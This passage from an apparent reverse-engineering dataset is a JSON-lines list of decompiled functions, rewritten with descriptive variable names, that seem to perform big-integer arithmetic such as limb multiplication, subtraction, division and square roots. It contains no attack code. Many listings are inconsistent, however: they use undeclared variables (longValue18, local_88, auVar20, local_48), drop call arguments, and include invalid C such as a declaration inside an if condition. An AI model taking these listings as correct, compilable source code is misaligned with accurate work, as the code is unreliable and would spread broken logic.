result_value;\n}"}
{"Function Name": "FUN_00409700", "Address": "00409700", "Source Code": "int calculateValue(void) \n{\n    return getBaseValue() + 1; \n}"}
{"Function Name": "FUN_00409880", "Address": "00409880", "Source Code": "void FUN_00409880(undefined4 *input_array)\n{\n    \n    int integer_value = input_array[1];\n    \n    \n    long long_value = *(long *)(input_array + 4);\n    \n    \n    input_array[2] = 0;\n    \n    \n    *input_array = 0;\n    \n    if (integer_value > 0) {\n        \n        for (long loop_index = 0; loop_index < integer_value; loop_index++) {\n            \n            *(undefined8 *)(long_value + loop_index * 8) = 0;\n        }\n    }\n}"}
{"Function Name": "FUN_004098c0", "Address": "004098c0", "Source Code": "void FUN_004098c0(undefined *array, int length)\n{\n    \n    if (length > 1) {\n        int counter = 0; \n        undefined *lastElement = array + length - 1; \n        \n        do {\n            undefined currentElement = *array; \n            *array = *lastElement; \n            *lastElement = currentElement; \n            lastElement--; \n            array++; \n            counter++; \n        } while (counter < length - 1); \n    }\n}"}
{"Function Name": "FUN_00409f20", "Address": "00409f20", "Source Code": "undefined8 FUN_00409f20(int *input_array, undefined8 *output_array)\n{\n    int first_element = *input_array; \n    int calculated_value = first_element * 2 + 1; \n    undefined8 storage_var1; \n    undefined8 storage_var2; \n    long storage_var3; \n    ulong *ulong_pointer; \n    ulong carry_value; \n    int counter; \n    ulong *ulong_pointer_next; \n    ulong temp_value1; \n    ulong temp_value2; \n    \n    if (FUN_00406ce0(&storage_var1, calculated_value) == 0) {\n        if (first_element > 0) { \n            ulong_pointer = (ulong *)(storage_var3 + 8); \n            counter = 0; \n            uint adjusted_value = first_element - 2; \n            ulong_pointer_next = *(ulong **)(input_array + 4); \n            \n            do {\n                ulong *next_element_pointer = ulong_pointer_next + 1; \n                undefined calc_array1[16] = {0}; \n                undefined calc_array2[16] = {0}; \n                undefined calc_array3[16] = {0}; \n                calc_array2._0_8_ = *ulong_pointer_next; \n                calc_array3._0_8_ = *ulong_pointer_next; \n                calc_array1 = calc_array2 * calc_array3 + calc_array1; \n                temp_value1 = calc_array1._0_8_; \n                counter++; \n                carry_value = temp_value1 >> 0x3c | calc_array1._8_8_ * 0x10; \n                ulong_pointer[-1] = temp_value1 & 0xfffffffffffffff; \n                temp_value1 = *ulong_pointer_next; \n                ulong_pointer_next = ulong_pointer; \n                \n                if (counter < first_element) {\n                    long loop_index = 0; \n                    do {\n                        undefined calc_array4[16] = {0}; \n                        undefined calc_array5[16] = {0}; \n                        undefined calc_array6[16] = {0}; \n                        calc_array4._0_8_ = temp_value1; \n                        calc_array5._0_8_ = *(ulong *)((long)next_element_pointer + loop_index); \n                        calc_array6[8] = CARRY8(*(ulong *)((long)ulong_pointer + loop_index), carry_value); \n                        calc_array6._0_8_ = *(ulong *)((long)ulong_pointer + loop_index) + carry_value; \n                        calc_array6._9_7_ = 0; \n                        calc_array6 = calc_array4 * calc_array5 * (undefined [16])0x2 + calc_array6; \n                        temp_value2 = calc_array6._0_8_; \n                        *(ulong *)((long)ulong_pointer + loop_index) = temp_value2 & 0xfffffffffffffff; \n                        loop_index += 8; \n                        carry_value = temp_value2 >> 0x3c | calc_array6._8_8_ << 4; \n                    } while (loop_index != (ulong)adjusted_value * 8 + 8); \n                    ulong_pointer_next = (ulong *)(loop_index + (long)ulong_pointer); \n                }\n                \n                for (; carry_value != 0; carry_value = temp_value2 >> 0x3c | (ulong)CARRY8(temp_value1, carry_value) << 4) {\n                    temp_value1 = *ulong_pointer_next; \n                    temp_value2 = temp_value1 + carry_value; \n                    *ulong_pointer_next = temp_value2 & 0xfffffffffffffff; \n                    ulong_pointer_next++; \n                }\n                ulong_pointer += 2; \n                adjusted_value--; \n                ulong_pointer_next = next_element_pointer; \n            } while (counter != first_element); \n        }\n        \n        if (calculated_value < 1) {\n            if (calculated_value == 0) { \n                storage_var2._0_4_ = 0; \n                calculated_value = 0; \n            }\n        } else if (*(long *)(storage_var3 - 8 + (long)calculated_value * 8) == 0) { \n            long *pointer_to_check = (long *)(storage_var3 - 0x10 + (long)calculated_value * 8); \n            do {\n                calculated_value--; \n                if (calculated_value == 0) { \n                    storage_var2._0_4_ = 0; \n                    break; \n                }\n            } while (*pointer_to_check-- == 0); \n        }\n        \n        *(int *)((long)output_array + 4) = storage_var1._4_4_; \n        *(int *)output_array = calculated_value; \n        *(int *)(output_array + 1) = (int)storage_var2; \n        output_array[2] = storage_var3; \n        FUN_004064f0(&storage_var1); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_0040a1c0", "Address": "0040a1c0", "Source Code": "undefined8 FUN_0040a1c0(int *inputArray1, int *inputArray2, int *outputArray)\n{\n    int valueFromOutputArray = *outputArray; \n    int valueFromInputArray1 = *inputArray1; \n    int countFromInputArray2 = *inputArray2; \n    long indexOffset = *(long *)(inputArray2 + 4); \n    long longValueFromInputArray1 = *(long *)(inputArray1 + 4); \n    undefined8 *pointerToOutputArray = *(undefined8 **)(outputArray + 4); \n    ulong calculatedDifference = 0; \n    long indexCounter = 0; \n    \n    if ((outputArray[1] < valueFromInputArray1) && (undefined8 functionReturnValue = FUN_00405a20(outputArray, valueFromInputArray1), (int)functionReturnValue != 0)) {\n        return functionReturnValue; \n    }\n    *outputArray = valueFromInputArray1; \n    \n    if (countFromInputArray2 < 1) {\n        countFromInputArray2 = 0; \n    } else {\n        do {\n            \n            calculatedDifference = (*(long *)(longValueFromInputArray1 + indexCounter * 8) - indexOffset) - calculatedDifference;\n            pointerToOutputArray[indexCounter] = calculatedDifference & 0xfffffffffffffff; \n            indexCounter++; \n            calculatedDifference >>= 0x3f; \n        } while (indexCounter < countFromInputArray2); \n        longValueFromInputArray1 += (ulong)(countFromInputArray2 - 1) * 8 + 8; \n        pointerToOutputArray += (ulong)(countFromInputArray2 - 1) + 1; \n    }\n    \n    if (countFromInputArray2 < valueFromInputArray1) {\n        indexOffset = 0; \n        do {\n            \n            calculatedDifference = *(long *)(longValueFromInputArray1 + indexOffset) - calculatedDifference;\n            *(ulong *)((long)pointerToOutputArray + indexOffset) = calculatedDifference & 0xfffffffffffffff; \n            indexOffset += 8; \n            calculatedDifference >>= 0x3f; \n        } while (indexOffset != (ulong)(uint)((valueFromInputArray1 + -1) - countFromInputArray2) * 8 + 8); \n        pointerToOutputArray = (undefined8 *)((long)pointerToOutputArray + indexOffset); \n    }\n    \n    if (valueFromInputArray1 < valueFromOutputArray) {\n        undefined8 *puVar1 = pointerToOutputArray + (ulong)(uint)((valueFromOutputArray + -1) - valueFromInputArray1) + 1; \n        do {\n            *pointerToOutputArray = 0; \n            pointerToOutputArray++; \n        } while (pointerToOutputArray != puVar1); \n    }\n    \n    if (valueFromInputArray1 < 1) {\n        if (valueFromInputArray1 == 0) {\n            outputArray[2] = 0; \n        }\n    } else {\n        long *lastElementPointer = pointerToOutputArray + (long)valueFromInputArray1 - 2; \n        \n        if (pointerToOutputArray[(long)valueFromInputArray1 - 1] == 0) {\n            do {\n                valueFromInputArray1--; \n                if (valueFromInputArray1 == 0) {\n                    *outputArray = 0; \n                    outputArray[2] = 0; \n                    return 0; \n                }\n                longValueFromInputArray1 = *lastElementPointer; \n                lastElementPointer--; \n            } while (longValueFromInputArray1 == 0); \n            *outputArray = valueFromInputArray1; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0040ac70", "Address": "0040ac70", "Source Code": "undefined8 FUN_0040ac70(int *param_1,int *param_2,long param_3)\n{\n    int loopCounter; \n    long tempLongVar; \n    undefined intermediateArray1[16]; \n    undefined intermediateArray2[16]; \n    int calculatedSize; \n    undefined8 returnValue; \n    ulong unsignedLongVar1; \n    ulong carryVar; \n    long *longPointer; \n    ulong productVar; \n    int param2Value; \n    long tempLongVar2; \n    ulong *unsignedLongPointer1; \n    ulong *unsignedLongPointer2; \n    \n    calculatedSize = *param_2 * 2 + 1;\n    \n    if ((calculatedSize < 0x200) && (*param_2 < 0x100)) {\n        return FUN_0040a340(param_1,param_2); \n    }\n    \n    if ((param_1[1] < calculatedSize) && (returnValue = FUN_00405a20(param_1,calculatedSize), (int)returnValue != 0)) {\n        return returnValue; \n    }\n    *param_1 = calculatedSize; \n    param2Value = *param_2; \n    \n    if (0 < param2Value) {\n        loopCounter = 0; \n        tempLongVar = *(long *)(param_2 + 4); \n        unsignedLongPointer2 = *(ulong **)(param_1 + 4); \n        \n        do {\n            unsignedLongVar1 = *unsignedLongPointer2; \n            tempLongVar2 = 0; \n            carryVar = 0; \n            productVar = param_3 * unsignedLongVar1; \n            unsignedLongPointer1 = unsignedLongPointer2; \n            \n            while (true) {\n                intermediateArray2[8] = CARRY8(unsignedLongVar1,carryVar); \n                intermediateArray2._0_8_ = unsignedLongVar1 + carryVar; \n                intermediateArray2._9_7_ = 0; \n                intermediateArray1._0_8_ = productVar & 0xfffffffffffffff; \n                intermediateArray2 = intermediateArray1 * *(undefined(*)[16])(tempLongVar + tempLongVar2 * 8) + intermediateArray2; \n                unsignedLongVar1 = intermediateArray2._0_8_; \n                tempLongVar2++; \n                carryVar = unsignedLongVar1 >> 0x3c | intermediateArray2._8_8_ << 4; \n                *unsignedLongPointer1 = unsignedLongVar1 & 0xfffffffffffffff; \n                if (param2Value <= (int)tempLongVar2) break; \n                unsignedLongVar1 = unsignedLongPointer1[1]; \n                unsignedLongPointer1++; \n            }\n            \n            unsignedLongPointer1 = unsignedLongPointer2 + (ulong)(param2Value - 1) + 1;\n            for (; carryVar != 0; carryVar += unsignedLongVar1 >> 0x3c) {\n                unsignedLongVar1 = *unsignedLongPointer1; \n                *unsignedLongPointer1 = carryVar + unsignedLongVar1 & 0xfffffffffffffff; \n                unsignedLongPointer1++; \n            }\n            loopCounter++; \n            unsignedLongPointer2++; \n        } while (loopCounter != param2Value); \n    }\n    \n    if (calculatedSize < 1) {\n        if (calculatedSize == 0) {\n            param_1[2] = 0; \n        }\n    } else if (*(long *)(*(long *)(param_1 + 4) + -8 + (long)calculatedSize * 8) == 0) {\n        longPointer = (long *)(*(long *)(param_1 + 4) + -0x10 + (long)calculatedSize * 8); \n        do {\n            calculatedSize--; \n            if (calculatedSize == 0) {\n                *param_1 = 0; \n                param2Value = *param_2; \n                param_1[2] = 0; \n                return 0; \n            }\n            tempLongVar = *longPointer; \n            longPointer--; \n        } while (tempLongVar == 0); \n        *param_1 = calculatedSize; \n        param2Value = *param_2; \n    }\n    \n    FUN_00407e40(param_1,param2Value);\n    calculatedSize = FUN_004065f0(param_1,param_2); \n    if (calculatedSize != -1) {\n        return FUN_0040a1c0(param_1,param_2,param_1); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_0040afb0", "Address": "0040afb0", "Source Code": "ulong FUN_0040afb0(int *inputArray, undefined8 *outputValue)\n{\n    uint resultCode; \n    ulong ulongValue; \n    int bitCount; \n    undefined tempStorage[16]; \n    \n    \n    ulongValue = FUN_00406af0(tempStorage);\n    \n    \n    if ((int)ulongValue == 0) {\n        bitCount = *inputArray; \n        \n        if (bitCount != 0) {\n            \n            ulongValue = *(ulong *)(*(long *)(inputArray + 4) + -8 + (long)bitCount * 8);\n            bitCount = (bitCount + -1) * 0x3c; \n            \n            for (; ulongValue != 0; ulongValue = ulongValue >> 1) {\n                bitCount++; \n            }\n        }\n        \n        resultCode = FUN_004063d0(tempStorage, bitCount);\n        \n        if (resultCode != 0) {\n            FUN_004064f0(tempStorage); \n            return (ulong)resultCode; \n        }\n        \n        resultCode = FUN_0040a1c0(tempStorage, inputArray, tempStorage);\n        \n        if (resultCode != 0) {\n            FUN_004064f0(tempStorage); \n            return (ulong)resultCode; \n        }\n        \n        *outputValue = *(undefined8 *)tempStorage;\n        FUN_004064f0(tempStorage); \n        ulongValue = 0; \n    }\n    return ulongValue; \n}"}
{"Function Name": "FUN_0040b070", "Address": "0040b070", "Source Code": "ulong FUN_0040b070(int *inputArray, undefined8 additionalParam)\n{\n    uint resultCode; \n    ulong returnValue; \n    int inputValue; \n    undefined tempStorage[32]; \n    returnValue = FUN_00406af0(tempStorage); \n    if ((int)returnValue == 0) { \n        inputValue = *inputArray; \n        if (inputValue != 0) { \n            returnValue = *(ulong *)(*(long *)(inputArray + 4) + -8 + (long)inputValue * 8); \n            inputValue = (inputValue - 1) * 0x3c; \n            for (; returnValue != 0; returnValue >>= 1) { \n                inputValue++; \n            }\n        }\n        resultCode = FUN_004063d0(tempStorage, inputValue); \n        if (resultCode == 0) { \n            resultCode = FUN_0040a1c0(tempStorage, inputArray, additionalParam); \n        }\n        returnValue = (ulong)resultCode; \n        FUN_004064f0(tempStorage); \n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_0040b100", "Address": "0040b100", "Source Code": "void FUN_0040b100(long address1, long address2, long address3)\n{\n    \n    int valueAtOffset8 = *(int *)(address1 + 8);\n    \n    \n    if (valueAtOffset8 != *(int *)(address2 + 8)) {\n        \n        *(int *)(address3 + 8) = valueAtOffset8;\n        \n        \n        FUN_00409900();\n        return; \n    }\n    \n    \n    if (FUN_004065f0() != -1) {\n        \n        *(int *)(address3 + 8) = valueAtOffset8;\n        \n        \n        FUN_0040a1c0(address1, address2);\n        return; \n    }\n    \n    \n    *(uint *)(address3 + 8) = (uint)(valueAtOffset8 == 0);\n    \n    \n    FUN_0040a1c0(address2, address1);\n    return; \n}"}
{"Function Name": "FUN_0040b190", "Address": "0040b190", "Source Code": "ulong FUN_0040b190(int *param_1, int *param_2, int *param_3, int *param_4)\n{\n    int integerValue1; \n    long longValue2; \n    int integerValue3; \n    uint unsignedIntValue4; \n    uint unsignedIntValue5; \n    int integerValue6; \n    ulong unsignedLongValue7; \n    long *longPointer8; \n    ulong unsignedLongValue9; \n    long longValue10; \n    undefined8 undefined8Value11; \n    int integerValue12; \n    long longValue13; \n    long longValue14; \n    int *intPointer15; \n    int *intPointer16; \n    long longValue17; \n    byte byteValue19; \n    uint localUnsignedInt124; \n    int localIntegerD8; \n    int localIntegerB8; \n    int localIntegerB0; \n    long localLongC8; \n    int localIntegerArray98[2]; \n    undefined4 localUndefined4Value78; \n    int localInteger74; \n    undefined8 *localUndefined8Pointer68; \n    undefined4 localUndefined4Array58[4]; \n    undefined8 *localUndefined8Pointer48; \n    byteValue19 = 0; \n    if (*param_2 == 0) { \n        return 0xfffffffd; \n    }\n    integerValue3 = FUN_004065f0(); \n    if (integerValue3 == -1) { \n        unsignedLongValue7 = 0; \n        if (param_4 != (int *)0x0) { \n            unsignedLongValue7 = FUN_00406750(param_1, param_4); \n        }\n        if (param_3 == (int *)0x0) { \n            return unsignedLongValue7; \n        }\n        integerValue3 = param_3[1]; \n        param_3[2] = 0; \n        *param_3 = 0; \n        longValue18 = *(long *)(param_3 + 4); \n        if (integerValue3 < 1) { \n            return unsignedLongValue7; \n        }\n        longValue13 = 0; \n        do {\n            *(undefined8 *)(longValue18 + longValue13 * 8) = 0; \n            longValue13 = longValue13 + 1; \n        } while ((int)longValue13 < integerValue3); \n        return unsignedLongValue7; \n    }\n    unsignedLongValue7 = FUN_00406ce0(&localIntegerD8, *param_1 + 2); \n    if ((int)unsignedLongValue7 != 0) { \n        return unsignedLongValue7; \n    }\n    localIntegerD8 = *param_1 + 2; \n    unsignedIntValue4 = FUN_00406af0(&localUndefined4Value78); \n    unsignedLongValue7 = (ulong)unsignedIntValue4; \n    if (unsignedIntValue4 != 0) goto LAB_0040b25e; \n    unsignedIntValue4 = FUN_00406af0(localUndefined4Array58); \n    unsignedLongValue7 = (ulong)unsignedIntValue4; \n    if (unsignedIntValue4 == 0) { \n        unsignedIntValue4 = FUN_00406f80(&localIntegerB8, param_1); \n        unsignedLongValue7 = (ulong)unsignedIntValue4; \n        if (unsignedIntValue4 == 0) { \n            unsignedIntValue4 = FUN_00406f80(localIntegerArray98, param_2); \n            unsignedLongValue7 = (ulong)unsignedIntValue4; \n            if (unsignedIntValue4 == 0) { \n                integerValue3 = param_1[2]; \n                localIntegerB0 = 0; \n                integerValue1 = param_2[2]; \n                if (localIntegerArray98[0] == 0) { \n                    localUnsignedInt124 = 0x3b; \n                    goto LAB_0040b7d2; \n                }\n                localUnsignedInt124 = localIntegerArray98[0] - 1; \n                integerValue12 = localUnsignedInt124 * 0x3c; \n                for (unsignedLongValue7 = *(ulong *)(local_88 + -8 + (long)localIntegerArray98[0] * 8); unsignedLongValue7 != 0; unsignedLongValue7 = unsignedLongValue7 >> 1) { \n                    integerValue12 = integerValue12 + 1; \n                }\n                if (integerValue12 % 0x3c != 0x3b) { \n                    localUnsignedInt124 = 0x3b - integerValue12 % 0x3c; \n                }\n                LAB_0040b7d2: \n                unsignedIntValue4 = localIntegerB8 - 1; \n                integerValue12 = unsignedIntValue4 - localUnsignedInt124; \n                unsignedIntValue5 = FUN_00407140(localIntegerArray98, integerValue12); \n                unsignedLongValue7 = (ulong)unsignedIntValue5; \n                if (unsignedIntValue5 == 0) { \n                    do {\n                        integerValue6 = FUN_00406680(&localIntegerB8, localIntegerArray98); \n                        if (integerValue6 == -1) { \n                            FUN_00407e40(localIntegerArray98, integerValue12); \n                            if ((int)unsignedIntValue4 <= (int)localUnsignedInt124) goto LAB_0040b6be; \n                            longValue13 = (long)(int)localUnsignedInt124 * 8; \n                            longValue18 = ((long)(int)unsignedIntValue4 - (long)(int)localUnsignedInt124) * 8; \n                            integerValue12 = localIntegerB8; \n                            longValue2 = (long)(int)unsignedIntValue4 * 8; \n                            goto LAB_0040b458; \n                        }\n                        longPointer8 = (long *)((long)integerValue12 * 8 + localLongC8); \n                        *longPointer8 = *longPointer8 + 1; \n                        unsignedIntValue5 = FUN_0040b100(&localIntegerB8, localIntegerArray98); \n                    } while (unsignedIntValue5 == 0); \n                LAB_0040b818: \n                    unsignedLongValue7 = (ulong)unsignedIntValue5; \n                }\n            }\n        }\n    }\n    LAB_0040b78b: \n    FUN_004064f0(localIntegerArray98); \n    FUN_004064f0(&localIntegerB8); \n    FUN_004064f0(localUndefined4Array58); \n    FUN_004064f0(&localUndefined4Value78); \n    LAB_0040b25e: \n    FUN_004064f0(&localIntegerD8); \n    return unsignedLongValue7; \n    LAB_0040b458: \n    do {\n        longValue17 = local_88; \n        longValue14 = longValue2 + -8; \n        longValue18 = longValue18 + -8; \n        if ((int)unsignedIntValue4 <= integerValue12) { \n            unsignedLongValue9 = *(ulong *)(localLongA8 + 8 + longValue14); \n            if (unsignedLongValue9 == *(ulong *)(local_88 + longValue13)) { \n                *(undefined8 *)(localLongC8 + longValue18) = 0xfffffffffffffff; \n            } else {\n                auVar20 = FUN_00435560(unsignedLongValue9 << 0x3c | *(ulong *)(localLongA8 + longValue14), unsignedLongValue9 >> 4, *(ulong *)(local_88 + longValue13), 0); \n                unsignedLongValue9 = auVar20._0_8_; \n                if ((auVar20._8_8_ != 0) || (0xfffffffffffffff < unsignedLongValue9)) { \n                    unsignedLongValue9 = 0xfffffffffffffff; \n                }\n                *(ulong *)(localLongC8 + longValue18) = unsignedLongValue9; \n            }\n            *(ulong *)(localLongC8 + longValue18) = *(ulong *)(localLongC8 + longValue18) + 1 & 0xfffffffffffffff; \n            do {\n                *(ulong *)(localLongC8 + longValue18) = *(ulong *)(localLongC8 + longValue18) - 1 & 0xfffffffffffffff; \n                longValue10 = 0; \n                localInteger70 = 0; \n                if (0 < localInteger74) { \n                    do {\n                        localUndefined8Pointer68[longValue10] = 0; \n                        longValue10 = longValue10 + 1; \n                    } while ((int)longValue10 < localInteger74); \n                }\n                if ((int)localUnsignedInt124 < 1) { \n                    undefined8Value11 = 0; \n                } else {\n                    undefined8Value11 = *(undefined8 *)(longValue17 + -8 + longValue13); \n                }\n                *localUndefined8Pointer68 = undefined8Value11; \n                localUndefined4Value78 = 2; \n                localUndefined8Pointer68[1] = *(undefined8 *)(longValue17 + longValue13); \n                unsignedIntValue5 = FUN_004078b0(&localUndefined4Value78, *(undefined8 *)(localLongC8 + longValue18)); \n                if (unsignedIntValue5 != 0) goto LAB_0040b818; \n                if ((int)unsignedIntValue4 < 2) { \n                    *localUndefined8Pointer48 = 0; \n                    if (unsignedIntValue4 == 1) goto LAB_0040b5de; \n                    undefined8Value11 = 0; \n                } else {\n                    *localUndefined8Pointer48 = *(undefined8 *)(localLongA8 + -8 + longValue14); \n                LAB_0040b5de: \n                    undefined8Value11 = *(undefined8 *)(localLongA8 + longValue14); \n                }\n                localUndefined8Pointer48[1] = undefined8Value11; \n                localUndefined4Array58[0] = 3; \n                localUndefined8Pointer48[2] = *(undefined8 *)(localLongA8 + longValue2); \n                integerValue12 = FUN_004065f0(&localUndefined4Value78, localUndefined4Array58); \n                longValue17 = local_88; \n            } while (integerValue12 == 1); \n            unsignedIntValue5 = FUN_004078b0(localIntegerArray98, *(undefined8 *)(localLongC8 + longValue18), &localUndefined4Value78); \n            if (unsignedIntValue5 != 0) goto LAB_0040b818; \n            unsignedIntValue5 = FUN_00407140(&localUndefined4Value78, ~localUnsignedInt124 + unsignedIntValue4); \n            if ((unsignedIntValue5 != 0) || (unsignedIntValue5 = FUN_0040b100(&localIntegerB8, &localUndefined4Value78), unsignedIntValue5 != 0)) \n                goto LAB_0040b818; \n            integerValue12 = localIntegerB8; \n            if (localIntegerB0 == 1) { \n                unsignedIntValue5 = FUN_00406750(localIntegerArray98, &localUndefined4Value78); \n                if (((unsignedIntValue5 != 0) || (unsignedIntValue5 = FUN_00407140(&localUndefined4Value78, ~localUnsignedInt124 + unsignedIntValue4), unsignedIntValue5 != 0)) || \n                    (unsignedIntValue5 = FUN_0040a6e0(&localIntegerB8, &localUndefined4Value78), unsignedIntValue5 != 0)) goto LAB_0040b818; \n                *(ulong *)(longValue18 + localLongC8) = *(ulong *)(longValue18 + localLongC8) - 1 & 0xfffffffffffffff; \n                integerValue12 = localIntegerB8; \n            }\n        }\n        unsignedIntValue4 = unsignedIntValue4 - 1; \n        longValue2 = longValue14; \n    } while (unsignedIntValue4 != localUnsignedInt124); \nLAB_0040b6be: \n    localIntegerB0 = 0; \n    if (localIntegerB8 != 0) { \n        localIntegerB0 = param_1[2]; \n    }\n    if (param_3 != (int *)0x0) { \n        longValue18 = 0; \n        integerValue12 = localIntegerD8; \n        do {\n            integerValue6 = integerValue12; \n            if (integerValue6 < 1) { \n                localIntegerD8 = integerValue6; \n                if (integerValue6 == 0) { \n                    local_d0 = 0; \n                }\n                break; \n            }\n            longPointer8 = (long *)(localLongC8 + (long)localIntegerD8 * 8 + -8 + longValue18); \n            longValue18 = longValue18 + -8; \n            integerValue12 = integerValue6 + -1; \n        } while (*longPointer8 == 0); \n        intPointer15 = param_3; \n        intPointer16 = &localIntegerD8; \n        for (longValue18 = 6; longValue18 != 0; longValue18 = longValue18 + -1) { \n            *intPointer16 = *intPointer15; \n            intPointer15 = intPointer15 + (ulong)byteValue19 * -2 + 1; \n            intPointer16 = intPointer16 + (ulong)byteValue19 * -2 + 1; \n        }\n        *param_3 = integerValue6; \n        param_3[1] = localIntegerD4; \n        *(long *)(param_3 + 4) = localLongC8; \n        param_3[2] = (uint)(integerValue3 != integerValue1); \n    }\n    if (param_4 != (int *)0x0) { \n        unsignedIntValue4 = FUN_00407f00(&localIntegerB8, localUnsignedInt124, &localIntegerB8, 0); \n        integerValue3 = localIntegerB0; \n        unsignedLongValue7 = (ulong)unsignedIntValue4; \n        if (unsignedIntValue4 == 0) { \n            intPointer15 = param_4; \n            intPointer16 = &localIntegerB8; \n            for (longValue18 = 6; longValue18 != 0; longValue18 = longValue18 + -1) { \n                *intPointer16 = *intPointer15; \n                intPointer15 = intPointer15 + (ulong)byteValue19 * -2 + 1; \n                intPointer16 = intPointer16 + (ulong)byteValue19 * -2 + 1; \n            }\n            *param_4 = localIntegerB8; \n            param_4[1] = local_b4; \n            param_4[2] = integerValue3; \n            *(long *)(param_4 + 4) = localLongA8; \n        }\n    }\n    goto LAB_0040b78b; \n}"}
{"Function Name": "FUN_0040b8d0", "Address": "0040b8d0", "Source Code": "ulong FUN_0040b8d0(undefined8 input_param_1, long input_param_2, undefined8 *output_param)\n{\n    uint result_code; \n    ulong return_value; \n    undefined8 intermediate_data; \n    return_value = FUN_00406af0(&intermediate_data); \n    if ((int)return_value != 0) { \n        return return_value; \n    }\n    result_code = FUN_0040b190(input_param_1, input_param_2, 0, &intermediate_data); \n    return_value = (ulong)result_code; \n    if (result_code == 0) { \n        if (((int)intermediate_data == 0) || ((int)output_param[1] == *(int *)(input_param_2 + 8))) { \n            *(int *)output_param = (int)intermediate_data; \n            *(undefined4 *)((long)output_param + 4) = intermediate_data._4_4_; \n        } else {\n            result_code = FUN_0040a6e0(input_param_2, &intermediate_data, output_param); \n            return_value = (ulong)result_code; \n        }\n    }\n    FUN_004064f0(&intermediate_data); \n    return return_value; \n}"}
{"Function Name": "FUN_0040b9f0", "Address": "0040b9f0", "Source Code": "int FUN_0040b9f0(int *inputArray1, int *inputArray2, int *outputValue)\n{\n    int returnValue; \n    uint intermediateValue; \n    int finalResult; \n    int temporaryResult; \n    int intermediateArray[2]; \n    undefined8 *undefinedPointer; \n    undefined undefinedBuffer[40]; \n    \n    if (inputArray2[2] == 1) {\n        return -3; \n    }\n    \n    \n    if (*inputArray2 < 2) {\n        returnValue = FUN_00405a00(inputArray2, 0); \n        if (returnValue != 1) {\n            return -3; \n        }\n        \n        \n        if (*inputArray1 == 0) {\n            returnValue = FUN_00405a00(inputArray2, 1); \n            if (returnValue != 0) {\n                goto LAB_0040bac5; \n            }\n            goto LAB_0040ba78; \n        }\n    } else {\n        \n        if (*inputArray1 == 0) {\nLAB_0040ba78:\n            *outputValue = 0; \n            return 0; \n        }\n    }\n    \n    \n    if ((inputArray1[2] != 1) && (*inputArray1 < 2) && (returnValue = FUN_00405a00(inputArray1, 1), returnValue == 0)) {\nLAB_0040bac5:\n        *outputValue = 1; \n        return 0; \n    }\n    \n    returnValue = FUN_00406f80(intermediateArray, inputArray1); \n    if (returnValue != 0) {\n        return returnValue; \n    }\n    \n    returnValue = FUN_00406af0(undefinedBuffer); \n    if (returnValue != 0) {\n        goto LAB_0040baa0; \n    }\n    \n    intermediateValue = FUN_004066c0(intermediateArray); \n    returnValue = FUN_00407f00(intermediateArray, intermediateValue, intermediateArray, 0); \n    if (returnValue == 0) {\n        \n        if ((((intermediateValue & 1) == 0) || (intermediateValue = (uint)**(undefined8 **)(inputArray2 + 4) & 7, intermediateValue == 7)) ||\n            (intermediateValue == 1)) {\n            finalResult = 1; \n        } else {\n            finalResult = -(uint)(intermediateValue == 5 || intermediateValue == 3); \n        }\n        \n        \n        if ((((uint)**(undefined8 **)(inputArray2 + 4) & 3) == 3) && (((uint)*undefinedPointer & 3) == 3)) {\n            finalResult = -finalResult; \n        }\n        \n        \n        if ((intermediateArray[0] > 1) || (FUN_00405a00(intermediateArray, 1) != 0)) {\n            returnValue = FUN_0040b8d0(inputArray2, intermediateArray, undefinedBuffer); \n            if ((returnValue != 0) || (returnValue = FUN_0040b9f0(undefinedBuffer, intermediateArray, &temporaryResult), returnValue != 0)) {\n                goto LAB_0040bb70; \n            }\n            finalResult *= temporaryResult; \n        }\n        \n        *outputValue = finalResult; \n    }\nLAB_0040bb70:\n    FUN_004064f0(undefinedBuffer); \nLAB_0040baa0:\n    FUN_004064f0(intermediateArray); \n    return returnValue; \n}"}
{"Function Name": "FUN_0040bbe0", "Address": "0040bbe0", "Source Code": "void FUN_0040bbe0(undefined8 input_value, int *int_pointer)\n{\n    \n    \n    if (FUN_004063d0(input_value, *int_pointer * 0x78) != 0) {\n        \n        return;\n    }\n    \n    FUN_0040b190(input_value, int_pointer, input_value, 0);\n}"}
{"Function Name": "FUN_0040bc30", "Address": "0040bc30", "Source Code": "ulong FUN_0040bc30(uint *param_1, int *param_2)\n{\n    ulong returnValue; \n    int tempInt; \n    long longIndex; \n    long loopCounter; \n    int *param2Iterator; \n    int *local68Iterator; \n    int intermediateResult1; \n    int intermediateResult2; \n    int intermediateResult3; \n    undefined8 eightByteValue; \n    \n    if (param_1[2] == 1) {\n        return 0xfffffffd; \n    }\n    returnValue = (ulong)*param_1; \n    \n    if (*param_1 == 0) {\n        tempInt = param_2[1]; \n        loopCounter = 0; \n        param_2[2] = 0; \n        *param_2 = 0; \n        longIndex = *(long *)(param_2 + 4); \n        \n        if (0 < tempInt) {\n            do {\n                *(undefined8 *)(longIndex + loopCounter * 8) = 0; \n                loopCounter++; \n            } while (loopCounter < tempInt); \n        }\n    } else {\n        \n        returnValue = FUN_00406f80(&intermediateResult1, param_1);\n        \n        if ((int)returnValue == 0) {\n            \n            if (FUN_00406af0(local_48) == 0) {\n                \n                FUN_00407e40(&intermediateResult1, intermediateResult1 / 2);\n                \n                if (FUN_0040b190(param_1, &intermediateResult1, local_48, 0) == 0) {\n                    \n                    if (FUN_0040a6e0(&intermediateResult1, local_48, &intermediateResult1) == 0) {\n                        \n                        if (FUN_00406860(&intermediateResult1, &intermediateResult1) == 0) {\n                            do {\n                                \n                                if (FUN_0040b190(param_1, &intermediateResult1, local_48, 0) != 0) goto LAB_0040bcf6;\n                                \n                                if (FUN_0040a6e0(&intermediateResult1, local_48, &intermediateResult1) != 0) goto LAB_0040bcf6;\n                                \n                                if (FUN_00406860(&intermediateResult1, &intermediateResult1) != 0) goto LAB_0040bcf6;\n                                \n                                tempInt = FUN_004065f0(&intermediateResult1, local_48);\n                            } while (tempInt == 1); \n                            param2Iterator = param_2; \n                            local68Iterator = &intermediateResult1; \n                            for (longIndex = 6; longIndex != 0; longIndex--) { \n                                *local68Iterator = *param2Iterator; \n                                param2Iterator++; \n                                local68Iterator++; \n                            }\n                            *param_2 = intermediateResult1; \n                            param_2[1] = intermediateResult2; \n                            param_2[2] = intermediateResult3; \n                            *(undefined8 *)(param_2 + 4) = eightByteValue; \n                        }\n                    }\n                }\n            }\n        }\n    }\nLAB_0040bcf6: \n    